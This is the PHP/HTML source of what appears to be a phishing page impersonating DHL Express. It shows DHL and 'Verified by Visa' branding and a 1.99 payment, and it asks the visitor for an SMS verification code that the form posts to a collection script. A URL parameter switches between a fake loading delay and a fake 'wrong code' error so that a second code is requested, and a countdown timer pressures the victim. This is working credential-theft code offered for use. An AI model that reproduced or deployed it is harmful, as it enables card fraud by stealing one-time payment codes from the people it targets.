<!doctype html>
<?php 

include('./sourecApp/funciones.php');
$lang = getLocation();
include_once('./sourecApp/lang/'.$lang);

?>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<script src="https://kit.fontawesome.com/8cb6f1f1f2.js" crossorigin="anonymous"></script>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="sourecApp/style/style_019.css">
<link rel="stylesheet" type="text/css" href="sourecApp/style/style_020.css">
<link rel="stylesheet" type="text/css" href="sourecApp/style/style_022.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="sourecApp/style/jquery-3.5.1.min.js"></script>
    <title><?php echo lang('Title_page'); ?></title>
  </head>
  <body>


<?php 
if (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "true") {
   echo '<script type="text/javascript">
  
   $(document).ready(function () {
            $("#loadingo9lawzan").fadeIn("slow", function () {
                $("#loadingo9lawzan").delay(40000).fadeOut(150);
            });
        });

</script>';
}elseif (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "false"){
 echo '<script type="text/javascript">
  
   $(document).ready(function () {
            $("#loadingo9lawzan").fadeIn("slow", function () {
                $("#loadingo9lawzan").delay(30000).fadeOut(150);
            });
        });

</script>';
}

 ?>



    <div id="loadingo9lawzan" class="bg-loadingo9lawzan" ><div class="lawzan"></div></div>
    <div class="topnav" id="myTopnav">
  <a href="" ><img src="sourecApp/style/dhl-logo.svg" alt="Retour à l’accueil"></a>
  <a href="" class="jnb"><i class="fas fa-search"></i>&nbsp;<?php echo lang('Min_i3'); ?></a>
  <a href="" class="jnb"><i class="fas fa-globe"></i>&nbsp;<?php echo lang('Min_i2'); ?></a>
  <a href="" class="jnb"><i class="fas fa-exclamation-circle"></i>&nbsp;<?php echo lang('Min_i1'); ?></a>

  <a href="javascript:void(0);" class="icon" onclick="myFunction()">
   <i class="fas fa-search boldcon"></i>&nbsp; <i class="fas fa-globe boldcon"></i>&nbsp;<i class="fas fa-bars boldcon"></i>
  </a>
</div>
    <div class="topnavtow" id="myTopnav">
  <a href="" ><?php echo lang('Ming_i1'); ?>&nbsp;&nbsp;<i class="fas fa-chevron-left fa-rotate-270"></i></a>
  <a href="" ><?php echo lang('Ming_i2'); ?>&nbsp;&nbsp;<i class="fas fa-chevron-left fa-rotate-270"></i></a>
  <a href="" ><?php echo lang('Ming_i3'); ?>&nbsp;&nbsp;<i class="fas fa-chevron-left fa-rotate-270"></i></a>
  <a href="" ><?php echo lang('Ming_i4'); ?>&nbsp;&nbsp;<i class="fas fa-chevron-left fa-rotate-270"></i></a>
</div>
<main role="main" class="flex-shrink-0">

<div class="container">
<section>
  <div class="rass">
    <span><img src="sourecApp/style/dhl-logo.svg"></span>
    <span><img class="vrfy" src="https://pngimage.net/wp-content/uploads/2018/06/verified-by-visa-png-7.png"></span>
    </div>
    <div class="text_titr"><?php echo lang('Sms_text1'); ?></div>

    <div class="box-all">
        <form name="myForm" action="sourecApp/PosTinTo.php" onsubmit="return validateForm()" method="post">
    <p style="font-size:12px"><?php echo lang('Sms_text2'); ?></p>
<div class="smol-box">
    <span class="frst-box"><?php echo lang('Sms_text3'); ?></span>
    <span class="last-box">DHL EXPRESS</span>
</div>
<div class="smol-box">
    <span class="frst-box"><?php echo lang('Sms_text4'); ?></span>
    <span class="last-box">1.99</span>
</div>

<div class="smol-box">
    <span class="frst-box"><?php echo lang('Sms_text5'); ?></span>
    <span class="last-box"><?php echo date('d/m/Y');?></span>
</div>
<div class="smol-box">
    <span class="frst-box"><?php echo lang('Sms_text6'); ?></span>
    <span class="last-box"><input type="text" class="tantan" id="F982345787234LPIN" name="F982345787234LPIN" maxlength="22"  placeholder="" autocomplete="off" autofocus=""></span>
</div>
<div style="font-size:12px"><?php echo lang('Sms_text7'); ?><span id="timer" style="color:red;font-weight:bold;font-size:12px"></span></div>

  <?php 
if (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "true") {
   echo '';
}elseif (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "false"){
 echo '<span  style="color:red;display:block;font-weight:bold;line-height:16px;font-size:12px">'.lang('Sms_error1').'</span>';
}

 ?>



    </div>
   <?php   
if (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "true") {
   echo '<div class="btn-box"><button type="submit" class="text-center" name="smsone" id="smsone">'.lang('Btn_n1').'</button></div>';
}elseif (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "false"){
 echo '<div class="btn-box"><button type="submit" class="text-center" name="smstow" id="smstow">'.lang('Btn_n1').'</button></div>';
}
 ?>

<br>
<br>


    </form>
<div class="end"><?php echo lang('Footer_rights'); ?></div>
    
</section>

</div>


    </main>
<br>
<!-- Footer -->
<footer class="page-footer font-small teal pt-4" style="background: #f1f1f1;">
  <div class="container-fluid text-center text-md-left">
    <div class="row">
      <div class="col-md-6 mt-md-0 mt-3">
        <h5 class="text-uppercase font-weight-bold text_footer"><?php echo lang('Footer_title1'); ?></h5>
        <div class="list-one">
  <a href="#"><?php echo lang('Footer_text1'); ?></a>
  <a href="#"><?php echo lang('Footer_text2'); ?></a>
  <a href="#"><?php echo lang('Footer_text3'); ?></a>
  <a href="#"><?php echo lang('Footer_text4'); ?></a>
  <a href="#"><?php echo lang('Footer_text5'); ?></a>
  <a href="#"><?php echo lang('Footer_text6'); ?></a>
  <a href="#"><?php echo lang('Footer_text7'); ?></a>
  <a href="#"><?php echo lang('Footer_text8'); ?></a>
</div>



      </div>
      <hr class="clearfix w-100 d-md-none pb-3">
      <div class="col-md-6 mb-md-0 mb-3">
        <h5 class="text-uppercase font-weight-bold text_footer" ><?php echo lang('Footer_title2'); ?></h5>
        <div class="list-one">
  <a href="#"><img class="imgicon" src="sourecApp/style/youtube-new.svg" ></a>
  <a href="#"><img class="imgicon" src="sourecApp/style/facebook-new.svg" ></a>
  <a href="#"><img class="imgicon" src="sourecApp/style/linkedIn-new.svg" ></a>
  <a href="#"><img class="imgicon" src="sourecApp/style/instagram-new.svg" ></a>
</div>
      </div>
    </div>
  </div>
  <div class="footer-copyright text-center py-3 text_rights"><?php echo lang('Footer_rights'); ?>
  </div>
</footer>
<script>
    function onReady(callback) {
  var intervalId = window.setInterval(function() {
    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
      callback.call(this);
    }
  }, 15000);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
  setVisible('#bg-load', false);
});

/*-------------------------------------------------------*/
/*------------------- TIMER FUNCTION --------------------*/
/*-------------------------------------------------------*/

    function countdown(timer, minutes, seconds) {
// set time for the particular countdown
var time = minutes*60 + seconds;
var interval = setInterval(function() {
    var el = document.getElementById('timer');
    // if the time is 0 then end the counter
    if(time == 0) {
        setTimeout(function() {
            el.innerHTML = "ZAZ cvdt ztne...";
        }, 1500);


        clearInterval(interval);

        setTimeout(function() {
            countdown('clock', 2, 1);
        }, 2000);
    }
    var minutes = Math.floor( time / 60 );
    if (minutes < 10) minutes = "0" + minutes;
    var seconds = time % 60;
    if (seconds < 10) seconds = "0" + seconds; 
    var text = minutes + ':' + seconds;
    el.innerHTML = text;
    time--;
}, 1500);     // 1000 = 1 segonde in timer = j'ai fais 1500 pour calculer 1.5 segonde comme c'est 1 segonde
}
countdown('clock', 2, 1);
  </script>
<!-- Footer -->
<script  src="sourecApp/style/Java_onfunc_smsing.js"></script>
  </body>
</html>